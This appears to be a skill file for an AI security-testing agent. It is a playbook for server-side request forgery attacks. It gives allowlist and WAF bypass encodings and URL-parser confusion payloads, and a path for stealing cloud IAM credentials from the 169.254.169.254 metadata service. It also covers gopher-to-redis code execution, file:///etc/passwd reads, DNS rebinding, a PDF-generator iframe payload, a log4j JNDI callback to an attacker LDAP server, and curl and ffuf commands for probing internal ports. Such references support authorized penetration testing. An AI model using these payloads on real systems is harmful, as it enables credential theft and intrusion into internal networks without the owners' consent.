---
name: ssrf
description: >-
  Server-Side Request Forgery — URL params, webhooks, PDF/import/avatar fetches,
  IMDS credential theft, internal port scan, parser-differential host validation.
  Auto-invoke when: url/webhook/import/image-url/avatar fields, PDF generators, link
  previews, `Host`/`X-Forwarded-Host`-built fetch targets, metadata hints
  (169.254.169.254). Do NOT load for: client-side redirects → use `open_redirect`; the
  fetched URL is rendered by the victim browser → `xss`.
family: differential
severity: medium → critical
---

# SSRF — direct · parser-driven · blind · cloud-metadata

> **Arsenal:** internal network read, cloud IAM credential theft (IMDS), port scan via
> timing/status side-channels, redis/gopher → RCE on blameless internal services.
> **Sibling:** `open_redirect` (client-side), `rce` (internal pivot), `cloud_iam_privesc`
> (credential use), `recon-cloud` (target discovery).
> **Proof bar:** observable effect from an INTERNAL resource — OOB callback, metadata
> response, error/timing/status differential on internal hosts (blind), or state change
> on an internal service.
> **Setup:** need one URL-typed input the SERVER fetches (not the browser).

## WAF Bypass (SSRF)
- Scheme/allowlist escape: `http://` → `//internal`, `http://evil@trusted` (@-trick), `http:internal`
- IP encoding: decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, IPv6 `[::1]`, `0` short-hand, `127.1`
- Domain tricks: `spoofed.burpcollaborator.net` via `nip.io`/`sslip.io`, trailing dot `evil.com.` parser splits
- Redirect bypass: allowlisted host 302 → internal (follow redirects) · DNS rebinding (TOCTOU)
- URL parser confusion: `http://internal#@evil.com`, backslash `http://internal\@evil.com`, `%0d%0a` in host
- Headers: `X-Forwarded-For`, `Referer`, custom `X-Custom-URL`/`Destination` honored by fetch libs
- Exotic schemes: `file://`, `gopher://`, `sftp://`, `dict://`, `ftp://` — scheme allowlist gaps

## Context
- Sink exists when the app fetches attacker-shaped URLs: webhook registration, avatar/image-import,
  PDF/HTML-to-PDF, link previews, SSO metadata, video thumbnails, RSS import, `requests`/`curl_exec`/Java HTTP client.
- Blind SSRF: no response reflection — only DNS/HTTP callbacks or timing/status deltas per port.

## General Techniques
- **Direct fetch:** URL param → internal `http://127.0.0.1:PORT/path` → response body reflected?
- **Response reflection:** fetch internal page, returned in your response (banner, admin page, config)
- **Blind via OAST:** your URL → Burp Collaborator/OAST domain in the field → callback proves fetch
- **Port scan oracle:** `http://127.0.0.1:22/` open vs closed — status/error/timing diff; fix target, vary port
- **IMDSv1:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → keys in body
- **IMDSv2 blocking:** `X-aws-ec2-metadata-token` (PUT with TTL) required → token first, then GET (GCP metadata.google.internal similar)
- **Internal service RCE:** `gopher://redis:6379/_…SET…` scripting; `dict://` for banner read; Jenkins/ES/Solr unauth admin
- **File scheme:** `file:///etc/passwd` where scheme filtering missing — confirm internal read
- **DNS rebinding:** hostname passed validation, rebinds to 127.0.0.1 for fetch (TOCTOU) — `1u.ms`/`rbndr.us` services
- **Redirect-following:** allowlisted URL that 302s to internal — needs redirects enabled

## Second-Order & Bypass Techniques
- Store the URL as "webhook" → server fetches it LATER on event (parser-driven fetch, async)
- PDF generator: HTML you control → `<iframe src="file:///etc/passwd">` or `<img src=http://169.254.169.254/>`
- Export/import job queues: upload a CSV containing URLs → row-processing fetches them

## Auth Bypass Techniques
- SSO/SAML IdP metadata URL must be fetched by SP → point to internal metadata service / attacker
- Link-unfurl endpoints on chat/mail systems: fetch token-protected internal links with app's credentials

## Header Techniques
- `Host:` / `X-Forwarded-Host:` building the fetch destination (direct-internal-fetch)
- Origin/BOFU headers the fetch lib honors: `X-Forwarded-For`, `Forwarded`, `X-Custom-URL`
- Referer used as fetch source in analytics/counting endpooints

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2021-22005 (VMware vCenter) | vCenter 6.7/7 | SSRF → file write RCE |
| CVE-2019-9670 (Zimbra) | Zimbra < 8.7.11 | XXE/SSRF proxy servlet |
| CVE-2021-44228 global | log4j 2.x with JNDI | ${jndi:ldap://} — SSRF-class OOB to attacker LDAP → RCE |

## Indicators — record as `possible` when seen
- Param names: url, uri, target, dest, image, img, file, webhook, callback, next, fetch, proxy, download
- Response echoes a page you fetch · timing/status changes per host/port tried
- `169.254.169.254`/`metadata.google.internal`/`token missing` hints in JS/errors
- Errors leak internal hostnames/IPs/stack (e.g. "Connection refused: 10.0.x.x")
- PDF/thumbnail/preview features exist on any input you upload or link

## Tools
- OAST: Burp Collaborator / interactsh (`interactsh-client`)
- `curl -s -X POST -d '{"url":"http://127.0.0.1:8080/admin"}' -H 'Content-Type: application/json' URL`
- `ffuf -w ports.txt -u 'URL?url=http://127.0.0.1:FUZZ/x' -mc all -fw N` for port oracle
- Burp SSRF map / `rbndr.us` for DNS rebinding; `gopher` payload via Burp or curl